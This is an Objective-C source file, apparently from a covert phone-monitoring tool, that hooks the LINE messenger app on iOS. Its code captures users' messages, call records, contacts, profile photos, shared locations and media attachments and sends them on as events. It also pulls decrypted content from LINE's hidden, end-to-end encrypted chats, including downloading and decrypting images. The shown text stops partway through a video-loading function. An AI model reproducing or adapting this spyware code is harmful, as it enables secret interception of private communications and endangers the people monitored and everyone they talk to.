//
//  LINEUtilsV2.m
//  MSFSP
//
//  Created by Makara Khloth on 8/20/15.
//
//

#import <objc/runtime.h>

#import "LINEUtilsV2.h"
#import "LINEUtils.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"

#import "ManagedMessage.h"
#import "ManagedChat.h"
#import "ManagedUser.h"

#import "TalkUserDefaultManager.h"
#import "LineLocation.h"
#import "ContactModel.h"
#import "LineStickerManager.h"
#import "LineStickerPackage.h"
#import "LineFileManager.h"
#import "LineFileDownload.h"
#import "LineMessage.h"

//Line 6.6.1
#import "NLAudioURLLoader.h"
#import "NLAudioURLLoader+6-6-1.h"

//For download incoming video
#import "NLMovieURLLoader.h"
#import "NLE2EEManager.h"
#import "NLObjectStorageOperation.h"
#import "NLObjectStorageLegacyDownloadOperation.h"
#import "NLObjectStorageOperationParameters.h"
#import "NLObjectStorageService.h"
#import "NLObjectStorageOpQueue.h"

//Line 6.7.0
#import "NLMessageBusinessLogic.h"

@interface LINEUtilsV2 (private)
+ (NSArray *) participantsFromMembers: (NSArray *) aMembers;
+ (NSData *) profileImageDataWithSubpath: (NSString *) aSubpath;
+ (BOOL) isHiddenMessage: (ManagedChat *) aChat;

+ (void) captureSharedLocationIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (void) captureSharedContactIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (void) captureStickerIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (BOOL) captureAudioIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (BOOL) capturePhotoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (BOOL) captureVideoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;

+ (void) delayCaptureAttachment: (NSArray *) aArgs;
@end

@implementation LINEUtilsV2

+ (void) captureLINEVoIP: (id) aMessage
                    chat: (ManagedChat *) aChat
                outgoing: (BOOL) aOutgoing {
    NSString *userId = nil;
    NSString *userDisplayName = nil;
    NSInteger duration = 0;
    FxEventDirection direction = kEventDirectionUnknown;
    
    if (aOutgoing) {
        LineMessage *lineMessage = aMessage;
        NSArray *members = [aChat sortedMembers];
        for (ManagedUser *obj in members) {
            userId = [obj midString];
            userDisplayName	= [obj displayUserName];
            duration = [[(NSDictionary *)[lineMessage contentMetadata] objectForKey:@"DURATION"] intValue] / 1000;
            break;
        }
        direction = kEventDirectionOut;
    } else {
        ManagedMessage *message = aMessage;
        userId = [[message sender] midString];
        userDisplayName = [[message sender] displayUserName];
        duration = [message callInterval];
        direction = (duration == 0) ? kEventDirectionMissedCall : kEventDirectionIn;
    }
    
    FxVoIPEvent *voipEvent = nil;
    voipEvent = [LINEUtils createLINEVoIPEventForContactID:userId
                                               contactName:userDisplayName
                                                  duration:duration
                                                 direction:direction];
    DLog (@"LINE VoIP event, %@", voipEvent);
    
    [LINEUtils sendLINEVoIPEvent:voipEvent];
}

+ (void) captureLINEMessage: (ManagedMessage *) aMessage
                       chat: (ManagedChat *) aChat
                   outgoing: (BOOL) aOutgoing {
    
    NSString *userId					= nil;
    NSString *userDisplayName			= nil;
    NSString *userStatusMessage			= nil;
    NSData *userPictureProfileData		= nil;
    NSString *imServiceId				= @"line";
    NSString *textMessage               = [aMessage text];
    NSMutableArray *participants		= [NSMutableArray array];
    FxEventDirection direction          = aOutgoing ? kEventDirectionOut : kEventDirectionIn;
    NSString *conversationID            = [aChat midString];
    NSString *conversationName          = [aChat titleWithMemberCount:NO];
    NSData *conversationProfilePicData	= nil;
    FxIMMessageRepresentation textRep   = kIMMessageText;
    BOOL hidden                         = [self isHiddenMessage:aChat];
    
    if (direction == kEventDirectionOut) {
        Class $TalkUserDefaultManager = objc_getClass("TalkUserDefaultManager");
        userId	= [$TalkUserDefaultManager mid];
        userDisplayName = [$TalkUserDefaultManager name];
        userStatusMessage = [$TalkUserDefaultManager statusMessage];
        userPictureProfileData = [self profileImageDataWithSubpath:[$TalkUserDefaultManager profilePicturePath]];
        
        participants = [NSMutableArray arrayWithArray:[self participantsFromMembers:[aChat sortedMembers]]];
    } else {
        Class $TalkUserDefaultManager = objc_getClass("TalkUserDefaultManager");
        userId	= [[aMessage sender] midString];
        userDisplayName = [[aMessage sender] displayUserName];
        userStatusMessage = [[aMessage sender] statusMessage];
        userPictureProfileData = [self profileImageDataWithSubpath:[[aMessage sender] pictureURL]];
        
        FxRecipient *participant = [[[FxRecipient alloc] init] autorelease];
        participant.recipNumAddr = [$TalkUserDefaultManager mid];
        participant.recipContactName = [$TalkUserDefaultManager name];
        participant.mStatusMessage = [$TalkUserDefaultManager statusMessage];
        participant.mPicture = [self profileImageDataWithSubpath:[$TalkUserDefaultManager profilePicturePath]];
        
        participants = [NSMutableArray arrayWithArray:[self participantsFromMembers:[aChat sortedMembers]]];
        [participants insertObject:participant atIndex:0];
        participant = nil;
        
        NSMutableArray *tempParticipants = [NSMutableArray arrayWithArray:participants];
        NSEnumerator *enumerator = [tempParticipants objectEnumerator];
        while (participant = [enumerator nextObject]) {
            if ([participant.recipNumAddr isEqualToString:userId]) {
                [participants removeObject:participant];
                break;
            }
        }
    }
    
    DLog(@"--------------------------------------------------------------------------------------");
    DLog(@"userId, %@", userId);
    DLog(@"userDisplayName, %@", userDisplayName);
    DLog(@"userStatusMessage, %@", userStatusMessage);
    DLog(@"userPictureProfileData, %lu", (unsigned long)[userPictureProfileData length]);
    DLog(@"imServiceId, %@", imServiceId);
    DLog(@"textMessage, [%lu] %@", (unsigned long)[textMessage length], textMessage);
    DLog(@"participants, %@", participants);
    DLog(@"direction, %d", direction);
    DLog(@"conversationID, %@", conversationID);
    DLog(@"conversationName, %@", conversationName);
    DLog(@"conversationProfilePicData, %lu", (unsigned long)[conversationProfilePicData length]);
    DLog(@"textRep, %d", textRep);
    DLog(@"hidden, %d", hidden);
    DLog(@"--------------------------------------------------------------------------------------");
    
    FxIMEvent *imEvent = [[FxIMEvent alloc] init];
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    
    [imEvent setMIMServiceID:imServiceId];
    [imEvent setMServiceID:kIMServiceLINE];
    
    [imEvent setMDirection:(FxEventDirection)direction];
    [imEvent setMRepresentationOfMessage:textRep];
    [imEvent setMMessage:textMessage];
    // -- user
    [imEvent setMUserID:userId];
    [imEvent setMUserDisplayName:userDisplayName];
    [imEvent setMUserStatusMessage:userStatusMessage];
    [imEvent setMUserPicture:userPictureProfileData];
    [imEvent setMUserLocation:nil];
    // -- conversation
    [imEvent setMConversationID:conversationID];
    [imEvent setMConversationName:conversationName];
    [imEvent setMConversationPicture:conversationProfilePicData];
    // -- participant
    [imEvent setMParticipants:participants];
    // -- attachment
    // -- share location
    
    DLog(@"contentType, %d", [aMessage contentType]);
    
    [self captureSharedLocationIfExist:imEvent message:aMessage chat:aChat];
    [self captureSharedContactIfExist:imEvent message:aMessage chat:aChat];
    [self captureStickerIfExist:imEvent message:aMessage chat:aChat];
    BOOL wait1 = [self captureAudioIfExist:imEvent message:aMessage chat:aChat];
    BOOL wait2 = [self capturePhotoIfExist:imEvent message:aMessage chat:aChat];
    BOOL wait3 = [self captureVideoIfExist:imEvent message:aMessage chat:aChat];
    DLog(@"wait1, wait2, wait3, %d, %d, %d", wait1, wait2, wait3);
    
    // -- hidden chat
    textRep = [imEvent mRepresentationOfMessage];
    if (hidden) {
        textRep |= kIMMessageHidden;
        [imEvent setMRepresentationOfMessage:textRep];
    }
    
    if (wait1 || wait2 || wait3) {
        DLog(@"ATTENTION: Delay for one and only one of {audio, photo, video} to complete download");
    } else {
        [LINEUtils sendLINEEvent:imEvent];
    }
    
    [imEvent release];
}

#pragma mark - Private methods -

+ (NSArray *) participantsFromMembers: (NSArray *) aMembers {
    NSMutableArray *participants = [NSMutableArray array];
    for (ManagedUser *obj in aMembers) {
        FxRecipient *participant = [[[FxRecipient alloc] init] autorelease];
        participant.recipNumAddr = [obj midString];
        participant.recipContactName = [obj displayUserName];
        participant.mStatusMessage = [obj statusMessage];
        participant.mPicture = [self profileImageDataWithSubpath:[obj pictureURL]];
        
        [participants addObject:participant];
    }
    DLog (@"participants: %@", participants);
    return (participants);
}

+ (NSData *) profileImageDataWithSubpath: (NSString *) aSubpath {
    DLog(@"aSubpath, %@", aSubpath);
    NSData *profileImageData = nil;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (aSubpath && [aSubpath length]) {
        NSString *profileImagePath = nil;
        
        // iOS 7
        NSArray *cachesPaths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
        profileImagePath = [cachesPaths objectAtIndex:0];
        profileImagePath = [profileImagePath stringByAppendingString:@"/Profile Images"];
        profileImagePath = [profileImagePath stringByAppendingString:aSubpath];
        profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
        
        if (![fileManager fileExistsAtPath:profileImagePath]) {
            // May be 5.10.0, iOS 7
            profileImagePath = [cachesPaths objectAtIndex:0];
            profileImagePath = [profileImagePath stringByAppendingString:@"/PrivateStore/P_"];
            profileImagePath = [profileImagePath stringByAppendingString:[objc_getClass("TalkUserDefaultManager") mid]];
            profileImagePath = [profileImagePath stringByAppendingString:@"/Profile Images"];
            profileImagePath = [profileImagePath stringByAppendingString:aSubpath];
            profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
        }
        
        DLog(@"profileImagePath, %@", profileImagePath);
        
        profileImageData = [NSData dataWithContentsOfFile:profileImagePath];
        if (!profileImageData) {
            // iOS 8,9
            NSURL *url = [fileManager containerURLForSecurityApplicationGroupIdentifier:@"group.com.linecorp.line"];
            DLog(@"AppGroup url, %@", url);     // file:///private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563/
            
            profileImagePath = [url path];      // /private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563
            profileImagePath = [profileImagePath stringByAppendingString:@"/Library/Caches/Profile Images"];
            profileImagePath = [profileImagePath stringByAppendingString:aSubpath];
            profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
            DLog(@"AppGroup profileImagePath, %@", profileImagePath);
            
            profileImageData = [NSData dataWithContentsOfFile:profileImagePath];
        }
        
        if (!profileImageData) {
            // 5.10.0, iOS 8,9
            NSURL *url = [fileManager containerURLForSecurityApplicationGroupIdentifier:@"group.com.linecorp.line"];
            DLog(@"AppGroup url, %@", url);     // file:///private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563/
            
            profileImagePath = [url path];      // /private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563
            profileImagePath = [profileImagePath stringByAppendingString:@"/Library/Caches/PrivateStore/P_"];
            profileImagePath = [profileImagePath stringByAppendingString:[objc_getClass("TalkUserDefaultManager") mid]];
            profileImagePath = [profileImagePath stringByAppendingString:@"/Profile Images"];
            profileImagePath = [profileImagePath stringByAppendingString:aSubpath];
            profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
            DLog(@"AppGroup profileImagePath, %@", profileImagePath);
            
            profileImageData = [NSData dataWithContentsOfFile:profileImagePath];
        }
    }
    DLog(@"profileImageData, %lu", (unsigned long)[profileImageData length]);
    return (profileImageData);
}

+ (BOOL) isHiddenMessage: (ManagedChat *) aChat {
    BOOL isHidden = NO;
    if ([aChat respondsToSelector:@selector(isPrivateChat)]) {
        isHidden = [aChat isPrivateChat];
    }
    return (isHidden);
}

#pragma mark - Shared location, Shared contact, Sticker, Audio, Photo and Video -

+ (void) captureSharedLocationIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    if ([aMessage contentType] == kLINEContentTypeShareLocation) {
        if ([aMessage respondsToSelector:@selector(lineLocation)]) {
            LineLocation *lineLocation = [aMessage lineLocation];
            DLog(@"lineLocation: %@", lineLocation);
            if (lineLocation) {
                float hor = -1;
                NSString *locationPlace	= [lineLocation title];
                if ([locationPlace isEqualToString: @"Location"]) {
                    locationPlace = [lineLocation address];
                }
                
                FxIMGeoTag *imGeoTag = [[FxIMGeoTag alloc] init];
                [imGeoTag setMLatitude:(float)[lineLocation latitude]];
                [imGeoTag setMLongitude:(float)[lineLocation longitude]];
                [imGeoTag setMHorAccuracy:hor];
                [imGeoTag setMPlaceName:locationPlace];
                DLog (@"imGeoTag, %@", imGeoTag);
                
                [aEvent setMShareLocation:imGeoTag];
                [aEvent setMRepresentationOfMessage:kIMMessageShareLocation];
                [imGeoTag release];

            }
            
        }
        else {//Line 6.6.0
            float hor = -1;
            
            FxIMGeoTag *imGeoTag = [[FxIMGeoTag alloc] init];
            [imGeoTag setMLatitude:(float)[aMessage latitude]];
            [imGeoTag setMLongitude:(float)[aMessage longitude]];
            [imGeoTag setMHorAccuracy:hor];	// default value when cannot get information
            [imGeoTag setMPlaceName:[aMessage locationText]];
            
            [aEvent setMShareLocation:imGeoTag];
            [aEvent setMRepresentationOfMessage:kIMMessageShareLocation];
            [imGeoTag release];
        }
    } else if ([self isHiddenMessage:aChat] && [aMessage contentType] == kLINEContentTypeText) { // 5.9.1, hidden incoming shared location content type is 0 (text)
        DLog(@"decryptedMessage: [%@], %@", [aMessage.decryptedMessage class], aMessage.decryptedMessage);
        DLog(@"location: [%@], %@", [aMessage.decryptedMessage.location class], aMessage.decryptedMessage.location);
        
        LineLocation *lineLocation = aMessage.decryptedMessage.location;
        DLog(@"lineLocation: %@", lineLocation);
        if (lineLocation) {
            float hor = -1;
            NSString *locationPlace	= [lineLocation title];
            if ([locationPlace isEqualToString: @"Location"]) {
                locationPlace = [lineLocation address];
            }
            
            FxIMGeoTag *imGeoTag = [[FxIMGeoTag alloc] init];
            [imGeoTag setMLatitude:(float)[lineLocation latitude]];
            [imGeoTag setMLongitude:(float)[lineLocation longitude]];
            [imGeoTag setMHorAccuracy:hor];
            [imGeoTag setMPlaceName:locationPlace];
            DLog (@"imGeoTag, %@", imGeoTag);
            
            [aEvent setMShareLocation:imGeoTag];
            [aEvent setMRepresentationOfMessage:kIMMessageShareLocation];
            [imGeoTag release];
        }
    }
}

+ (void) captureSharedContactIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    if ([aMessage contentType] == kLINEContentTypeContact) {
        ContactModel *contactModel = [aMessage contactModel];
        NSString *displayName = [contactModel displayName]	? [contactModel displayName] : @"" ;
        NSString *contactID = [contactModel mid] ? [contactModel mid] : @"";
        DLog (@"LINE: contactID, %@", contactID);
        DLog (@"LINE: displayName, %@", displayName);
        
        NSString *contactMsg = [[NSString alloc] initWithFormat:@"Name: %@", displayName];
        DLog (@"contactMsg, %@", contactMsg);
        
        [aEvent setMMessage:contactMsg];
        [aEvent setMRepresentationOfMessage:kIMMessageContact];
    }
}

+ (void) captureStickerIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    if ([aMessage contentType] == kLINEContentTypeSticker) {
        [aEvent setMMessage:nil];
        
        Class $LineStickerManager = objc_getClass("LineStickerManager");
        LineStickerPackage *lineStickerPackage = [$LineStickerManager packageWithStickerID:[aMessage sticker]];
        DLog(@"lineStickerPackage, %@", [lineStickerPackage class]);
        UIImage *stickerImage = [lineStickerPackage imageForSticker:[aMessage sticker] type:0];
        NSData *stickerData = UIImagePNGRepresentation(stickerImage);
        if (stickerData) {
            FxAttachment *attachment = [[[FxAttachment alloc] init] autorelease];
            [attachment setMThumbnail:stickerData];
            
            [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
            [aEvent setMRepresentationOfMessage:kIMMessageSticker];
            /*
            NSString *tempPath = NSTemporaryDirectory();
            tempPath = [tempPath stringByAppendingString:@"sticker.png"];
            [stickerData writeToFile:tempPath atomically:YES];
            DLog(@"tempPath, %@", tempPath);
             */
        }
        DLog(@"stickerData: %lu, stickerImage: %@", (unsigned long)[stickerData length], stickerImage);
    }
}

+ (BOOL) captureAudioIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    BOOL wait = NO;
    if ([aMessage contentType] == kLINEContentTypeAudioMessage) {
        if ([aEvent mDirection] == kEventDirectionOut) {
            NSString *audioPath = [aMessage text]; // text property stores audio path in outgoing
            NSData *audioData = [NSData dataWithContentsOfFile:audioPath];
            FxAttachment *attachment = [LINEUtils attachment:audioData thumbnail:nil extension:[audioPath pathExtension]];
            if (attachment) {
                [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [aEvent setMRepresentationOfMessage:kIMMessageNone];
            }
        } else {
            NSString *audioPath = [[aMessage audioFileURL] path];
            NSString *messageId = [aMessage performSelector:@selector(id)];
            DLog (@"messageId, %@", messageId);
            DLog (@"audioPath, %@", audioPath);
            DLog (@"attachedFileURL, %@", [aMessage attachedFileURL]);
            DLog (@"attachedFileDownloadURL, %@", [aMessage attachedFileDownloadURL]);
            DLog (@"text, %@", [aMessage text]);
            
            if (audioPath && messageId) {
                // -- load audio
                //[LINEUtils loadAudio:aMessage];
                wait = YES;
                
                NSNumber *hiddenChat = [NSNumber numberWithBool:[self isHiddenMessage:aChat]];
                NSArray *args = [NSArray arrayWithObjects:aEvent, audioPath, hiddenChat, aMessage, nil];
                [NSThread detachNewThreadSelector:@selector(delayCaptureAttachment:)
                                         toTarget:self
                                       withObject:args];
            }
        }
    }
    return (wait);
}

+ (BOOL) capturePhotoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    BOOL wait = NO;
    if ([aMessage contentType] == kLINEContentTypeImage) {
        NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
        
        
        //DLog(@"imageName: %@", [aMessage imageName]);
        DLog(@"attachedFileName: %@", [aMessage attachedFileName]);
        DLog(@"imageURL: %@", [aMessage imageURL]);
        
        NSData *imageData = [aMessage imageData];
        NSData *thumbnailData = [aMessage thumbnail];
        DLog(@"imageData: %lu", (unsigned long)[imageData length]);
        DLog(@"thumbnailData: %lu", (unsigned long)[thumbnailData length]);
        
        if ([aEvent mDirection] == kEventDirectionOut) {
            FxAttachment *attachment = [LINEUtils attachment:imageData thumbnail:thumbnailData extension:@"jpg"];
            if (attachment) {
                [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [aEvent setMRepresentationOfMessage:kIMMessageNone];
            }
        } else {
            // -- Download incoming image for hidden and unhidden images
            if (!imageData) {
                wait = YES;
                NSString *imagePath = [aMessage imageURL]; // text property stores image path in outgoing
                DLog(@"imagePath, %@", imagePath);

                NSNumber *hiddenChat = [NSNumber numberWithBool:[self isHiddenMessage:aChat]];
                NSArray *args = [NSArray arrayWithObjects:aEvent, imagePath, hiddenChat, aMessage, nil];
                [NSThread detachNewThreadSelector:@selector(delayCaptureAttachment:)
                                         toTarget:self
                                       withObject:args];
            } else {
                FxAttachment *attachment = [LINEUtils attachment:imageData thumbnail:thumbnailData extension:@"jpg"];
                if (attachment) {
                    [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                    [aEvent setMRepresentationOfMessage:kIMMessageNone];
                }
            }
        }
        [pool release];
    }
    return (wait);
}

+ (BOOL) captureVideoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    BOOL wait = NO;
    if ([aMessage contentType] == kLINEContentTypeVideo) {
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        
        NSData *thumbnailData = [aMessage thumbnail];
        DLog(@"thumbnailData: %lu", (unsigned long)[thumbnailData length]);
        
        NSString *videoPath = [aMessage text]; // text property stores video path in outgoing
        // e.g: /private/var/mobile/Applications/AE1DDA64-3BBE-4AAB-A3C4-08DA00035AA7/tmp/461932972.203773.mp4;
        
        DLog(@"videoPath, %@", videoPath);
        
        
        NSData *videoData = [NSData dataWithContentsOfFile:videoPath];
        DLog(@"videoData, %lu", (unsigned long)[videoData length]);
        if (!videoData) {
            //outgoing video send as asset need to load from asset url
            wait = YES;
            
//            if (aEvent.mDirection == kEventDirectionIn) {
//                [LINEUtilsV2 loadVideo:aMessage];
//            }
            
            NSNumber *hiddenChat = [NSNumber numberWithBool:[self isHiddenMessage:aChat]];
            NSArray *args = [NSArray arrayWithObjects:aEvent, videoPath, hiddenChat, aMessage, nil];
            [NSThread detachNewThreadSelector:@selector(delayCaptureAttachment:)
                                     toTarget:self
                                   withObject:args];
        }
        
        FxAttachment *attachment = [LINEUtils attachment:videoData thumbnail:thumbnailData extension:[videoPath pathExtension]];
        if (attachment) {
            [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
            [aEvent setMRepresentationOfMessage:kIMMessageNone];
        }
        
        [pool release];
    }
    return (wait);
}

#pragma mark - Utils -

+ (void) delayCaptureAttachment: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    @try {
        DLog(@"delayCaptureAttachment with aArgs: %@", aArgs);
        
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        NSString *attachmentPath = [aArgs objectAtIndex:1];
        BOOL hiddenChat = [[aArgs objectAtIndex:2] boolValue];
        id messageObject = [aArgs objectAtIndex:3];
        int contentType = [messageObject contentType];
        NSData *attachmentData = nil;
        NSString *fileExtension = [attachmentPath pathExtension];
        NSData *thumbnailData = nil;
        
        if (contentType == kLINEContentTypeAudioMessage) {
            [LINEUtilsV2 loadAudioV2:messageObject];
        }
        else if (contentType == kLINEContentTypeVideo) {
            //For outgoing load video data from asset url
            if (imEvent.mDirection == kEventDirectionOut) {
                NSDictionary *videoDict = [LINEUtilsV2 loadVideoFromAsset:[NSURL URLWithString:attachmentPath]];
                if ([videoDict objectForKey:@"data"]) {
                    attachmentData = [videoDict objectForKey:@"data"];
                    thumbnailData = [[messageObject thumbnail] copy];
                    DLog(@"thumbnailData: %lu", (unsigned long)[thumbnailData length]);
                }
                
                if ([videoDict objectForKey:@"filename"]) {
                    fileExtension = [[videoDict objectForKey:@"filename"] pathExtension];
                }
            }
            else {//For incoming load data by using Line api
                NSDictionary *videoDict = [LINEUtilsV2 loadVideoFromServer:messageObject];
                if ([videoDict objectForKey:@"data"]) {
                    attachmentData = [videoDict objectForKey:@"data"];
                    thumbnailData = [[messageObject thumbnail] copy];
                    fileExtension = @"mp4";
                    imEvent.mMessage = @"";
                    DLog(@"thumbnailData: %lu", (unsigned long)[thumbnailData length]);
                }
            }
        }
        else if (contentType == kLINEContentTypeImage) {
            thumbnailData = [[messageObject thumbnail] copy];
            DLog(@"thumbnailData: %@", thumbnailData);
            DLog(@"thumbnailData length: %lu", (unsigned long)[thumbnailData length]);

            attachmentData = [LINEUtilsV2 loadImageFromServer:messageObject];
            fileExtension = @"jpg";
          
            DLog(@"attachment");
            DLog(@"attachmentData: %@", attachmentData);
        }
        
        //Change logic to wait for attachement and add timeout as well
        if (!attachmentData) {
            attachmentData = [NSData dataWithContentsOfFile:attachmentPath];
        }
        
        FxAttachment *attachment = [LINEUtils attachment:attachmentData thumbnail:thumbnailData extension:fileExtension];
        if (attachment) {
            FxIMMessageRepresentation textRep = kIMMessageNone;
            if (hiddenChat) {
                textRep |= kIMMessageHidden;
            }
            [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
            [imEvent setMRepresentationOfMessage:textRep];
        }
        DLog(@"attachmentData: %lu, ext: %@", (unsigned long)[attachmentData length], [attachmentPath pathExtension]);
        [LINEUtils sendLINEEvent:imEvent];
        [thumbnailData release];
    }
    @catch (NSException *exception) {
        DLog(@"exception: %@", exception);
    }
    @finally {
        ;
    }
    [aArgs release];
    [pool release];
}

+ (void) loadAudioV2: (id) aMessage {
    DLog (@"!!!!!!!!!!!!!!!!!!!!!!! loading audio !!!!!!!!!!!!!!!!!!")
    @try {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        int timeout = 300;
        
        Class $NLAudioURLLoader		= objc_getClass("NLAudioURLLoader");
        NLAudioURLLoader *loader	= [$NLAudioURLLoader alloc];
        
        if ([loader respondsToSelector:@selector(initWithMessageClass:)]) {
            [loader initWithMessageClass:[aMessage class]];
        }
        else {
            [loader init];
        }
        
        if ([loader respondsToSelector:@selector(loadAudioWithObjectID:knownDownloadURL:)]) {
            [loader loadAudioWithObjectID:[aMessage performSelector:@selector(id)] knownDownloadURL:nil];
            dispatch_semaphore_signal(sem);
        }
        else if ([loader respondsToSelector:@selector(loadAudioAtURL:withMessageID:knownDownloadURL:completion:)]) {
            DLog(@"new vesion of audio loader")
            Class $NLE2EEManager		= objc_getClass("NLE2EEManager");
            NLE2EEManager* eeManager = [$NLE2EEManager sharedManager];
            
            [eeManager checkIfKeyExchangeNeededCompletionBlock:^(){
                @try {
                    DLog(@"checkIfKeyExchangeNeededCompletionBlock");
                    [loader loadAudioAtURL:nil withMessageID:[aMessage performSelector:@selector(id)] knownDownloadURL:nil completion:^(NSURL *completeUrl) {
                        DLog(@"Load Audio Complete");
                        dispatch_semaphore_signal(sem);
                    }];
                } @catch (NSException *exception) {
                    DLog(@"Found Exception %@", exception);
                } @finally {
                        //Done
                }
            }];
        }
        else {
            dispatch_semaphore_signal(sem);
        }
        
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(timeout * NSEC_PER_SEC)));
        
        dispatch_release(sem);
        
        [loader release];
    } @catch (NSException *exception) {
        DLog(@"Found Exception %@", exception);
    } @finally {
            //Done
    }
}

+ (NSDictionary *) loadVideoFromAsset: (NSURL *) assetURL {
    DLog (@"!!!!!!!!!!!!!!!!!!!!!!! loading video for asset !!!!!!!!!!!!!!!!!!")
    __block NSMutableDictionary *videoDataDic = [NSMutableDictionary dictionary];
    
    @try {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        
            //For outgoing should have code to load for asset url
        ALAssetsLibrary *library = [[[ALAssetsLibrary alloc] init] autorelease];
            // Try to load asset at mediaURL
        DLog(@"assetURL %@", assetURL);
        
        
        [library assetForURL:assetURL resultBlock:^(ALAsset *asset) {
            @try {
                    // If asset exists
                if (asset) {
                        // Type your code here for successful
                    DLog(@"Asset %@", asset);
                    ALAssetRepresentation *rep = [asset defaultRepresentation];
                    DLog(@"filename %@", [rep filename]);
                    Byte *buffer = (Byte*)malloc((NSUInteger)rep.size);
                    NSUInteger buffered = [rep getBytes:buffer fromOffset:0.0 length:(NSUInteger)rep.size error:nil];
                    NSData *attachmentData = [NSData dataWithBytesNoCopy:buffer length:buffered freeWhenDone:NO];;
                    [videoDataDic setObject:[rep filename] forKey:@"filename"];
                    [videoDataDic setObject:attachmentData forKey:@"data"];
                    DLog(@"attachmentData %lu", (unsigned long)[attachmentData length]);
                } else {
                    DLog(@"Asset not found");
                        // Type your code here for not existing asset
                }
                DLog(@"*** [UNLOCK... READING VIDEO BLOCK, OK] ****");
                dispatch_semaphore_signal(sem);
            } @catch (NSException *exception) {
                DLog(@"Found Exception %@", exception);
            } @finally {
                    //Done;
            }
            
        } failureBlock:^(NSError *error) {
                // Type your code here for failure (when user doesn't allow location in your app)
            DLog(@"error %@", error);
            DLog(@"*** [UNLOCK... READING VIDEO BLOCK, FAIL] ****");
            dispatch_semaphore_signal(sem);
        }];
        
        DLog(@"*** [LOCK... WAITING VIDEO BLOCK TO COMPLETE] ****");
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
        dispatch_release(sem);
    } @catch (NSException *exception) {
        DLog(@"Found Exception %@", exception);
    } @finally {
        //Done;
    }

    
    return videoDataDic;
}

+ (NSData *)loadImageFromServer:(id)aMessage{
    NSData *imageData = nil;
    
    @try {
        __block BOOL imageDownloaded = NO;
        Class $LineFileManager = objc_getClass("LineFileManager");
            // Download image
        
        NSString *imageName = @"";
        
        //ImageName Property remove in 6.7.0
        if ([aMessage respondsToSelector:@selector(imageName)]) {
            imageName = [aMessage imageName];
        }
        else if ([aMessage respondsToSelector:@selector(attachedFileName)]) {
            imageName = [aMessage attachedFileName];
            Class $NLMessageBusinessLogic = objc_getClass("NLMessageBusinessLogic");
            imageName = [$NLMessageBusinessLogic imageNameOfMessage:aMessage];
        }
        
        DLog(@"imageName %@", imageName);
        
        //
        LineFileDownload *downloadedImage = [$LineFileManager downloadImageNamed:imageName
                                                                           atURL:[aMessage imageURL]
                                                                         inStore:1
                                                                 completionBlock:^(){
                                                                     DLog(@"Finished downloading image");
                                                                     imageDownloaded = YES;
                                                                 }
                                             ];
        
        NSInteger count = 0;
            //Increase timeout from 5 second to 60 second
        while (!imageDownloaded && count < 60) {
            count++;
            [NSThread sleepForTimeInterval:1];
            //DLog(@"downloadedImage, %@", downloadedImage);
            DLog(@"count, %ld", (long)count);
        }
        
        NSData *tempData = [downloadedImage dataDownloaded];
        // DLog(@"tempData %@", tempData);
        
            // For hidden message, the data we got from tempData is the encrypted one
        if ([self isHiddenMessage:[aMessage primitiveChat]]) {
            imageData = [aMessage decryptedImageDataWithData:tempData];
        }
            // For unhidden message, the data we got from tempData is the plain data
        else {
            imageData = tempData;
        }
        DLog(@"Downloaded, imageData: %lu", (unsigned long)[imageData length]);
    } @catch (NSException *exception) {
        DLog(@"Found exception %@",exception);
    } @finally {
            //Done
    }
    
    return imageData;
}

+ (NSDictionary *) loadVideoFromServer: (id) aMessage {
    [NSThread sleepForTimeInterval:3.0];
